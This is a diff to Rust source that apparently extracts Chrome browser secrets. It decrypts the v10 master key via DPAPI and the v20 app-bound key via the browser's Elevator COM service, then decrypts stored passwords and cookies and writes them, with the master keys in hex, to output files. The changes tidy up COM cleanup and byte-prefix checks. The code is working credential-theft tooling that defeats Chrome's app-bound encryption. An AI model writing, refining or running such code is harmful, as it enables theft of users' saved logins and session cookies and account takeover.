@@ -97,44 +97,55 @@ fn decrypt_dpapi(data: &[u8]) -> Result<Vec<u8>, String> {
 fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
     unsafe {
         let hr = CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
-        if hr < 0 && hr as u32 != 0x80010106 { // RPC_E_CHANGED_MODE can be ignored
+        let co_init = hr >= 0 || hr as u32 == 0x80010106;
+        if !co_init {
             return Err(format!("CoInitializeEx başarısız: 0x{:08X}", hr as u32));
         }
 
-        let mut elevator_ptr: *mut c_void = ptr::null_mut();
-        let hr = CoCreateInstance(&CLSID_ELEVATOR, ptr::null_mut(), CLSCTX_LOCAL_SERVER, &IID_IELEVATOR2, &mut elevator_ptr);
+        let result = (|| {
+            let mut elevator_ptr: *mut c_void = ptr::null_mut();
+            let hr = CoCreateInstance(&CLSID_ELEVATOR, ptr::null_mut(), CLSCTX_LOCAL_SERVER, &IID_IELEVATOR2, &mut elevator_ptr);
 
-        if hr < 0 {
-            return Err(format!("CoCreateInstance başarısız: 0x{:08X}", hr as u32));
+            if hr < 0 {
+                return Err(format!("CoCreateInstance başarısız: 0x{:08X}", hr as u32));
+            }
+
+            let hr_blanket = CoSetProxyBlanket(elevator_ptr as *mut winapi::um::unknwnbase::IUnknown, 10, 0, ptr::null_mut(), 6, 3, ptr::null_mut(), 0x40);
+            if hr_blanket < 0 {
+                let _ = log_message(&format!("CoSetProxyBlanket başarısız: 0x{:08X}", hr_blanket as u32));
+            }
+
+            let bstr_encrypted = SysAllocStringByteLen(encrypted_blob.as_ptr() as *const i8, encrypted_blob.len() as UINT);
+            if bstr_encrypted.is_null() {
+                let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
+                ((*vtable).Release)(elevator_ptr);
+                return Err("SysAllocStringByteLen başarısız".to_string());
+            }
+
+            let mut bstr_decrypted: BSTR = ptr::null_mut();
+            let mut last_error: u32 = 0;
+            let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
+            let hr = ((*vtable).DecryptData)(elevator_ptr, bstr_encrypted, &mut bstr_decrypted, &mut last_error);
+
+            SysFreeString(bstr_encrypted);
+
+            if hr < 0 {
+                ((*vtable).Release)(elevator_ptr);
+                return Err(format!("DecryptData başarısız: 0x{:08X}, last_error: {}", hr as u32, last_error));
+            }
+
+            let byte_len = SysStringByteLen(bstr_decrypted) as usize;
+            let decrypted = std::slice::from_raw_parts(bstr_decrypted as *const u8, byte_len).to_vec();
+            SysFreeString(bstr_decrypted);
+            ((*vtable).Release)(elevator_ptr);
+
+            Ok(decrypted)
+        })();
+
+        if hr >= 0 {
+            winapi::um::combaseapi::CoUninitialize();
         }
-
-        let hr_blanket = CoSetProxyBlanket(elevator_ptr as *mut winapi::um::unknwnbase::IUnknown, 10, 0, ptr::null_mut(), 6, 3, ptr::null_mut(), 0x40);
-        if hr_blanket < 0 {
-            let _ = log_message(&format!("CoSetProxyBlanket başarısız: 0x{:08X}", hr_blanket as u32));
-        }
-
-        let bstr_encrypted = SysAllocStringByteLen(encrypted_blob.as_ptr() as *const i8, encrypted_blob.len() as UINT);
-        if bstr_encrypted.is_null() {
-            return Err("SysAllocStringByteLen başarısız".to_string());
-        }
-
-        let mut bstr_decrypted: BSTR = ptr::null_mut();
-        let mut last_error: u32 = 0;
-        let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
-        let hr = ((*vtable).DecryptData)(elevator_ptr, bstr_encrypted, &mut bstr_decrypted, &mut last_error);
-
-        SysFreeString(bstr_encrypted);
-
-        if hr < 0 {
-            return Err(format!("DecryptData başarısız: 0x{:08X}, last_error: {}", hr as u32, last_error));
-        }
-
-        let byte_len = SysStringByteLen(bstr_decrypted) as usize;
-        let decrypted = std::slice::from_raw_parts(bstr_decrypted as *const u8, byte_len).to_vec();
-        SysFreeString(bstr_decrypted);
-        ((*vtable).Release)(elevator_ptr);
-
-        Ok(decrypted)
+        result
     }
 }
 
@@ -164,7 +175,7 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
         if let Some(key_b64) = os_crypt.get("encrypted_key").and_then(|v| v.as_str()) {
             use base64::engine::Engine as _;
             let encrypted_key = base64::engine::general_purpose::STANDARD.decode(key_b64)?;
-            if &encrypted_key[0..5] == b"DPAPI" {
+            if encrypted_key.starts_with(b"DPAPI") {
                 v10_key = decrypt_dpapi(&encrypted_key[5..])?;
                 writeln!(master_keys_file, "v10 Master Key (hex): {}", v10_key.iter().map(|b| format!("{:02x}", b)).collect::<String>())?;
             }
@@ -179,7 +190,7 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
     if let Some(b64) = key_b64 {
         use base64::engine::Engine as _;
         let decoded = base64::engine::general_purpose::STANDARD.decode(b64)?;
-        let blob = if decoded.len() >= 4 && &decoded[0..4] == b"APPB" { &decoded[4..] } else { &decoded };
+        let blob = if decoded.starts_with(b"APPB") { &decoded[4..] } else { &decoded };
         match decrypt_with_elevator(blob) {
             Ok(k) => {
                 v20_key = k;
@@ -220,9 +231,9 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
                     for row in rows.flatten() {
                         let (url, user, pass_blob) = row;
                         let pass = if pass_blob.len() > 15 {
-                            let key = if &pass_blob[0..3] == b"v20" { &v20_key } else { &v10_key };
+                            let key = if pass_blob.starts_with(b"v20") { &v20_key } else { &v10_key };
                             if !key.is_empty() {
-                                aes_gcm_decrypt(key, &pass_blob).unwrap_or_else(|_| "[Decryption Failed]".to_vec())
+                                aes_gcm_decrypt(key, &pass_blob).unwrap_or_else(|_| b"[Decryption Failed]".to_vec())
                             } else { b"[No Key]".to_vec() }
                         } else { b"[Blob Too Short]".to_vec() };
                         writeln!(results_file, "URL: {}\nUser: {}\nPass: {}\n", url, user, String::from_utf8_lossy(&pass))?;
@@ -244,7 +255,7 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
                     for row in rows.flatten() {
                         let (host, name, blob) = row;
                         if blob.len() > 15 {
-                            let is_v20 = &blob[0..3] == b"v20";
+                            let is_v20 = blob.starts_with(b"v20");
                             let key = if is_v20 { &v20_key } else { &v10_key };
                             if !key.is_empty() {
                                 if let Ok(decrypted) = aes_gcm_decrypt(key, &blob) {
